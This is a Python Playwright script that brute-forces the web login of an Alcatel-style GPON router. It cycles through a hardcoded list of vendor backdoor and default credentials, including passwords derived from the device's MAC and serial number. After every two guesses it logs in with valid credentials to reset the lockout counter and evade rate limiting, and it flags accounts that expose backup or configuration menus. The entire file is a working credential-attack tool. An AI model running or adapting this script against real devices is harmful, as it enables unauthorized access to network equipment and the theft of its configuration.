import asyncio
import os
from playwright.async_api import async_playwright
from dotenv import load_dotenv

load_dotenv()

MAC = "145808ED0500" 
SN = "ALCLB2603A69"  

GOOD_USER = os.getenv("ROUTER_USER")
GOOD_PASS = os.getenv("ROUTER_PASS")

BACKDOORS = [
    ("AdminGPON", "ALC_FGU"),
    ("adminadmin", "ALC#FGU"),
    ("admin", "ALC#FGU"),
    ("admin", "1234"),
    ("admin", "admin"),
    ("support", "support"),
    ("support", "1234"),
    ("debug", "debug"),
    ("debug", "1234"),
    ("telecomadmin", "admintelecom"),
    ("root", "admin"),
    ("root", "root"),
    ("admin", MAC),
    ("admin", SN),
    ("Admin", MAC),
    ("Admin", SN),
    ("admin", SN.lower()),
    ("Admin", SN.lower()),
    ("useradmin", SN),
    ("support", "support123"),
    ("operator", "operator"),
]

# Build the smart sequence: 2 backdoors, then 1 good login to reset the counter
test_sequence = []
for i in range(0, len(BACKDOORS), 2):
    test_sequence.extend(BACKDOORS[i:i+2])
    test_sequence.append((GOOD_USER, GOOD_PASS, True)) # True = is_good_cred

# Add the last ones if the list length was odd
if len(BACKDOORS) % 2 != 0:
    test_sequence.append(BACKDOORS[-1])
    test_sequence.append((GOOD_USER, GOOD_PASS, True))

async def attempt_login(context, user, pwd, is_good=False):
    page = await context.new_page()
    try:
        await page.goto(os.getenv("ROUTER_IP"), timeout=15000)
        inputs = await page.locator("input").all()
        for inp in inputs:
            if not await inp.is_visible(): continue
            itype = await inp.get_attribute("type")
            if itype == 'text': await inp.fill(user)
            elif itype == 'password': await inp.fill(pwd)
        
        buttons = page.locator("button, input[type='button'], input[type='submit'], a")
        for i in range(await buttons.count()):
            btn = buttons.nth(i)
            if await btn.is_visible():
                text = (await btn.text_content() or await btn.get_attribute("value") or "").lower()
                if "log" in text or "sign" in text or "submit" in text:
                    await btn.click()
                    break
                    
        await asyncio.sleep(4) # Give it time to process and redirect
        url = page.url
        content = await page.content()
        
        # Check for lockout message just in case
        if "error happen over 4 times" in content.lower() or "retry later" in content.lower():
            print(f"[!] LOCKOUT DETECTED! Waiting 60 seconds to cool down...")
            await asyncio.sleep(60)
            return False

        if is_good:
            if "login" in url.lower() or "password" in content.lower()[:1000] or "invalid" in content.lower():
                print(f"[-] WARNING: Known good credentials failed! Check your .env file.")
                return False
            else:
                print(f"[+] Lockout reset successful with known good credentials.")
                return True
        
        # Check backdoor success
        if "login" in url.lower() or "password" in content.lower()[:1000] or "invalid" in content.lower() or "failed" in content.lower():
            print(f"[-] Failed: {user} / {pwd}")
            return False
        else:
            print(f"[!] SUCCESS: {user} / {pwd} -> Landed on: {url}")
            if "backup" in content.lower() or "configuration" in content.lower() or "romfile" in content.lower() or "super" in content.lower() or "management" in content.lower():
                print(f"    -> BINGO! Backup/Config menu or God-Mode keywords visible for this user!")
                return "BINGO"
            return True
            
    except Exception as e:
        print(f"[-] Error testing {user}/{pwd}: {e}")
        return False
    finally:
        await page.close()

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(ignore_https_errors=True)
        
        print(f"[*] Starting smart brute-force. Testing {len(BACKDOORS)} backdoors with interleaved lockout resets...")
        
        for creds in test_sequence:
            if len(creds) == 3:
                user, pwd, is_good = creds
            else:
                user, pwd = creds
                is_good = False
                
            result = await attempt_login(context, user, pwd, is_good)
            if result == "BINGO":
                print("[*] God-Mode account found! Stopping script.")
                break
                
        await browser.close()
        print("[*] Done testing.")

if __name__ == "__main__":
    asyncio.run(main())
